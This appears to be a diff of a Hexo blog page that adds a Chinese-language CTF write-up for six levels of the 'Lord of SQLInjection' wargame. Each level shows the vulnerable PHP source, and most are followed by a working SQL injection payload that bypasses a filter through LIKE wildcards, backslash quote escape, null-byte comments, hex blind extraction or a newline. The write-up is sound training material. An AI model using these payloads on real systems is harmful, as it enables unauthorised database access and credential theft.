@@ -99,24 +99,28 @@
 
 
 
-  <meta name="description" content="空集是所有集合的子集">
-<meta name="keywords" content="Web安全、CTF、代码审计、安全开发、渗透测试、PHP、code">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Huha&#39;s Blog">
-<meta property="og:url" content="http://yoursite.com/categories/Web安全/index.html">
+  <meta name="description" content="assassin123456789101112&amp;lt;?php   include &quot;./config.php&quot;;   login_chk();   $db = dbconnect();   if(preg_match(&apos;/\&apos;/i&apos;, $_GET[pw])) exit(&quot;No Hack ~_~&quot;);   $query = &quot;select id from prob_assassin where p">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Lord of SQLInjection Write Up(二)">
+<meta property="og:url" content="http://yoursite.com/2019/07/29/Lord-of-SQLInjection-Write-Up-二/index.html">
 <meta property="og:site_name" content="Huha&#39;s Blog">
-<meta property="og:description" content="空集是所有集合的子集">
+<meta property="og:description" content="assassin123456789101112&amp;lt;?php   include &quot;./config.php&quot;;   login_chk();   $db = dbconnect();   if(preg_match(&apos;/\&apos;/i&apos;, $_GET[pw])) exit(&quot;No Hack ~_~&quot;);   $query = &quot;select id from prob_assassin where p">
 <meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190729105411307.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20190729105426939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODA5ODk2,size_16,color_FFFFFF,t_70">
+<meta property="og:updated_time" content="2019-07-29T03:00:12.946Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Huha&#39;s Blog">
-<meta name="twitter:description" content="空集是所有集合的子集">
+<meta name="twitter:title" content="Lord of SQLInjection Write Up(二)">
+<meta name="twitter:description" content="assassin123456789101112&amp;lt;?php   include &quot;./config.php&quot;;   login_chk();   $db = dbconnect();   if(preg_match(&apos;/\&apos;/i&apos;, $_GET[pw])) exit(&quot;No Hack ~_~&quot;);   $query = &quot;select id from prob_assassin where p">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20190729105411307.png">
 
 
 
 
 
 
-  <link rel="canonical" href="http://yoursite.com/categories/Web安全/">
+  <link rel="canonical" href="http://yoursite.com/2019/07/29/Lord-of-SQLInjection-Write-Up-二/">
 
 
 
@@ -126,7 +130,7 @@
   };
 </script>
 
-  <title>分类: Web安全 | Huha's Blog</title>
+  <title>Lord of SQLInjection Write Up(二) | Huha's Blog</title>
   
 
 
@@ -174,7 +178,7 @@
     
   
 
-  <div class="container sidebar-position-left ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -246,7 +250,7 @@
         
         
           
-          <li class="menu-item menu-item-categories menu-item-active">
+          <li class="menu-item menu-item-categories">
 
     
     
@@ -293,25 +297,6 @@
   
     
 
-    
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-      
-      
-    
-    
-
-  
-
-
   
 
   
@@ -356,57 +341,236 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block category">
+  <div id="posts" class="posts-expand">
+    
 
-    <div id="posts" class="posts-collapse">
-      <div class="collection-title">
-        <h1>Web安全<small>分类</small>
-        </h1>
-      </div>
+  
 
-      
-        
+  
+  
+  
+
+  
 
   <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/29/Lord-of-SQLInjection-Write-Up-二/">
 
-      <h2 class="post-title">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Huha">
+      <meta itemprop="description" content="空集是所有集合的子集">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Huha's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
         
-          <a class="post-title-link" href="/2019/07/24/xss入门总结/" itemprop="url">
-            
-              <span itemprop="name">XSS入门总结</span>
-            
-          </a>
         
-      </h2>
+          <h1 class="post-title" itemprop="name headline">Lord of SQLInjection Write Up(二)
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-07-24T21:36:54+08:00" content="2019-07-24">
-          07-24
-        </time>
-      </div>
+              
+            
+          </h1>
+        
 
-    </header>
-  </article>
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-07-29 10:59:28 / 修改时间：11:00:12" itemprop="dateCreated datePublished" datetime="2019-07-29T10:59:28+08:00">2019-07-29</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/SQL注入/" itemprop="url" rel="index"><span itemprop="name">SQL注入</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2019/07/29/Lord-of-SQLInjection-Write-Up-二/" class="leancloud_visitors" data-flag-title="Lord of SQLInjection Write Up(二)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数：</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="assassin"><a href="#assassin" class="headerlink" title="assassin"></a>assassin</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">  include <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/i'</span>, $_GET[pw])) exit(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_assassin where pw like '&#123;$_GET[pw]&#125;'"</span>; </span><br><span class="line">  echo <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) echo <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>; </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"assassin"</span>); </span><br><span class="line">  highlight_file(__FILE__); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>用like进行模糊匹配，百度可知MYSQL语句like语法支持通配符匹配</p>
+<p>即like ‘a%’匹配所有以a字符开头的字符串<br> <img src="https://img-blog.csdnimg.cn/20190729105411307.png" alt="在这里插入图片描述"><br>如上，存在匹配多条记录的可能<br>利用burp进行fuzz，发现like ‘9%’能成功匹配出记录，但页面中显示“hello guest”，所以就可以知道，guest与admin的密码第一位相同，而guest记录在admin记录前面，所以无法匹配到admin，以此类推，直到第三位才匹配出admin记录</p>
+<p><img src="https://img-blog.csdnimg.cn/20190729105426939.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxODA5ODk2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"> </p>
+<h2 id="succubus"><a href="#succubus" class="headerlink" title="succubus"></a>succubus</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  include <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk();</span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[id])) exit(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) exit(<span class="string">"No Hack ~_~"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/'</span>,$_GET[id])) exit(<span class="string">"HeHe"</span>);</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/\'/'</span>,$_GET[pw])) exit(<span class="string">"HeHe"</span>);</span><br><span class="line">  $query = <span class="string">"select id from prob_succubus where id='&#123;$_GET[id]&#125;' and pw='&#123;$_GET[pw]&#125;'"</span>; </span><br><span class="line">  echo <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) solve(<span class="string">"succubus"</span>); </span><br><span class="line">  highlight_file(__FILE__); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>对单引号进行了过滤，但没有对反斜杆进行过滤，通过注入\可以吃掉一个单引号，造成单引号逃逸</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\&amp;pw=or <span class="number">1</span>%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="ZOMBIE-ASSASSIN"><a href="#ZOMBIE-ASSASSIN" class="headerlink" title="ZOMBIE_ASSASSIN"></a>ZOMBIE_ASSASSIN</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">  include <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect();</span><br><span class="line">  $_GET[<span class="string">'id'</span>] = strrev(addslashes($_GET[<span class="string">'id'</span>]));</span><br><span class="line">  $_GET[<span class="string">'pw'</span>] = strrev(addslashes($_GET[<span class="string">'pw'</span>]));</span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[id])) exit(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) exit(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_zombie_assassin where id='&#123;$_GET[id]&#125;' and pw='&#123;$_GET[pw]&#125;'"</span>; </span><br><span class="line">  echo <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) solve(<span class="string">"zombie_assassin"</span>); </span><br><span class="line">  highlight_file(__FILE__); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>与上面那题有异曲同工之初，同样是利用反斜杠进行单引号逃逸<br>addslashes转义了反斜杠，但也是用反斜杠进行的转义，合理利用这个特点即能进行绕过</p>
+<h3 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=%<span class="number">00</span>&amp;pw=%<span class="number">231</span> ro</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="nightmare"><a href="#nightmare" class="headerlink" title="nightmare"></a>nightmare</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">  include <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)|#|-/i'</span>, $_GET[pw])) exit(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  <span class="keyword">if</span>(strlen($_GET[pw])&gt;<span class="number">6</span>) exit(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_nightmare where pw=('&#123;$_GET[pw]&#125;') and id!='admin'"</span>; </span><br><span class="line">  echo <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) solve(<span class="string">"nightmare"</span>); </span><br><span class="line">  highlight_file(__FILE__); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>对长度和常规注释符号进行过滤<br>注释符使用;%00<br>逻辑运算符换用^</p>
+<h3 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pw=<span class="string">')^0;%00</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="xavis"><a href="#xavis" class="headerlink" title="xavis"></a>xavis</h2><p>因为这次的密码是韩文，需要利用hex()函数装换为十六进制，爆破出十六进制字符串</p>
+<h3 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h3><p>?pw=1’ or id=’admin’ and ord(substr(hex(pw),27,1))&gt;79%23</p>
+<h2 id="DRAGON"><a href="#DRAGON" class="headerlink" title="DRAGON"></a>DRAGON</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">  include <span class="string">"./config.php"</span>; </span><br><span class="line">  login_chk(); </span><br><span class="line">  $db = dbconnect(); </span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">'/prob|_|\.|\(\)/i'</span>, $_GET[pw])) exit(<span class="string">"No Hack ~_~"</span>); </span><br><span class="line">  $query = <span class="string">"select id from prob_dragon where id='guest'# and pw='&#123;$_GET[pw]&#125;'"</span>;</span><br><span class="line">  echo <span class="string">"&lt;hr&gt;query : &lt;strong&gt;&#123;$query&#125;&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span>; </span><br><span class="line">  $result = @mysqli_fetch_array(mysqli_query($db,$query)); </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>]) echo <span class="string">"&lt;h2&gt;Hello &#123;$result[id]&#125;&lt;/h2&gt;"</span>; </span><br><span class="line">  <span class="keyword">if</span>($result[<span class="string">'id'</span>] == <span class="string">'admin'</span>) solve(<span class="string">"dragon"</span>);</span><br><span class="line">  highlight_file(__FILE__); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+
+<p>寻找突破#注释的方法，发现#是单行注释，顾名思义，不能注释下一行的内容，这就是突破点<br>传入%0a作为换行符</p>
+<h2 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?pw=<span class="number">1</span><span class="string">'%0aand pw = '</span><span class="number">1</span><span class="string">'or id='</span>admin<span class="string">'%23</span></span><br></pre></td></tr></table></figure>
 
 
       
     </div>
 
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/07/26/红日代码审计项目学习-Day8/" rel="next" title="红日代码审计项目学习(Day8)">
+                <i class="fa fa-chevron-left"></i> 红日代码审计项目学习(Day8)
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
+  </article>
 
-  
 
+  </div>
 
 
           </div>
           
+
+  
+
+
 
         </div>
         
@@ -427,8 +591,17 @@
       
 
       
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
 
-      <div class="site-overview-wrap sidebar-panel sidebar-panel-active">
+      <div class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
           <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
@@ -512,6 +685,23 @@
         </div>
       </div>
 
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#assassin"><span class="nav-number">1.</span> <span class="nav-text">assassin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#succubus"><span class="nav-number">2.</span> <span class="nav-text">succubus</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload"><span class="nav-number">2.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ZOMBIE-ASSASSIN"><span class="nav-number">3.</span> <span class="nav-text">ZOMBIE_ASSASSIN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-1"><span class="nav-number">3.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#nightmare"><span class="nav-number">4.</span> <span class="nav-text">nightmare</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-2"><span class="nav-number">4.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xavis"><span class="nav-number">5.</span> <span class="nav-text">xavis</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#payload-3"><span class="nav-number">5.1.</span> <span class="nav-text">payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#DRAGON"><span class="nav-number">6.</span> <span class="nav-text">DRAGON</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-4"><span class="nav-number">7.</span> <span class="nav-text">payload</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
       
 
       
@@ -639,6 +829,10 @@ Views <span id="busuanzi_value_site_pv"></span> 520 times&nbsp&nbsp&nbsp
   
 
   
+  <script src="/js/src/scrollspy.js?v=6.7.0"></script>
+<script src="/js/src/post-details.js?v=6.7.0"></script>
+
+
 
   
 
@@ -994,43 +1188,42 @@ Views <span id="busuanzi_value_site_pv"></span> 520 times&nbsp&nbsp&nbsp
   
   <script>
     
-    function showTime(Counter) {
-      var entries = [];
+    function addCount(Counter) {
       var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
 
-      $visitors.each(function () {
-        entries.push( $(this).attr("id").trim() );
-      });
-
-      Counter('get', '/classes/Counter', { where: JSON.stringify({ url: { "$in": entries } }) })
+      Counter('get', '/classes/Counter', { where: JSON.stringify({ url }) })
         .done(function ({ results }) {
-          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
-
-          if (results.length === 0) {
-            $visitors.find(COUNT_CONTAINER_REF).text(0);
-            return;
-          }
-
-          for (var i = 0; i < results.length; i++) {
-            var item = results[i];
-            var url = item.url;
-            var time = item.time;
-            var element = document.getElementById(url);
-
-            $(element).find(COUNT_CONTAINER_REF).text(time);
-          }
-          for(var i = 0; i < entries.length; i++) {
-            var url = entries[i];
-            var element = document.getElementById(url);
-            var countSpan = $(element).find(COUNT_CONTAINER_REF);
-            if( countSpan.text() == '') {
-              countSpan.text(0);
-            }
+          if (results.length > 0) {
+            var counter = results[0];
+            
+            Counter('put', `/classes/Counter/${counter.objectId}`, JSON.stringify({ time: { "__op":"Increment", "amount":1 } }))
+            
+            .done(function () {
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(counter.time + 1);
+            })
+            
+            .fail(function ({ responseJSON }) {
+                console.log('Failed to save Visitor num, with error message: ' + responseJSON.error);
+            })
+          } else {
+            
+              Counter('post', '/classes/Counter', JSON.stringify({ title: title, url: url, time: 1}))
+                .done(function () {
+                  var $element = $(document.getElementById(url));
+                  $element.find('.leancloud-visitors-count').text(1);
+                })
+                .fail(function () {
+                  console.log('Failed to create');
+                });
+            
           }
         })
-        .fail(function ({ responseJSON }) {
-          console.log("LeanCloud Counter Error: " + responseJSON.code + " " + responseJSON.error);
-        });
+      .fail(function ({ responseJSON }) {
+        console.log('LeanCloud Counter Error:' + responseJSON.code + " " + responseJSON.error);
+      });
     }
     
 
@@ -1050,9 +1243,7 @@ Views <span id="busuanzi_value_site_pv"></span> 520 times&nbsp&nbsp&nbsp
             });
           };
           
-          if ($('.post-title-link').length >= 1) {
-            showTime(Counter);
-          }
+          addCount(Counter);
           
         })
     });
